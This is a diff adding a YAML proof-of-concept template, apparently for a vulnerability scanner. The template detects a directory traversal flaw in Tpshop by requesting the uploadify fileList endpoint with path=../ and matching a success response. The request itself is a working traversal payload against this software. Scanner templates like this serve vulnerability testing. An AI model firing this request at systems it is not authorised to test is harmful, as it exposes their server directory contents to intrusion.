@@ -1,0 +1,23 @@
+id: poc-yaml-tpshop-directory-traversal
+info:
+  name: Tpshop Directory Traversal
+  severity: high
+  tags:
+  - 目录遍历
+  finger: Tpshop
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /index.php/Home/uploadify/fileList?type=.+&path=../
+  headers:
+    Accept-Encoding: deflate
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "\"state\":\"SUCCESS\"") && contains(body,
+    "total")
+  output: []
